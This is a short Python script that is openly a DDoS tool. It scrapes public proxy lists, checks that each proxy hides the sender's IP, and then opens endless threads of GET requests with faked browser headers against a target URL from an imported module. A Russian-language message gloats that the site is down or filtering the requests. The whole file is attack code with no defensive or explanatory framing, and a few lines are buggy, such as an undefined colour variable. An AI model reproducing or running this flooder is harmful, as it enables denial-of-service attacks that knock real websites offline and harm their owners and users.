#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import random
import requests as r
import threading
from fake_headers import Headers
import targetdos as td

def clear():
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def check_prox(array, url):
	ip = r.post("http://ip.beget.ru/").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, url))
		thread_list.append(t)
		t.start()

def check(ip, prox, url):
	try:
		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
	except:
		ipx = ip
	if ip != ipx:
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	while True:
		headers = Headers(headers=True).generate()
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(url, headers, proxies))
		thread_list.append(t)
		t.start()

def start_ddos(url, headers, proxies):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			pass
		else:
			print(color + "Сайт лежит или отсеивает твои запросы :)")
	except:
		pass

def main():
	clear()
	url = td
	while True:
		req = r.get("https://api.proxyscrape.com/?request=displayproxies")
		array = req.text.split()
		print("Found {} new proxies".format(len(array)))
		check_prox(array, url)

main()
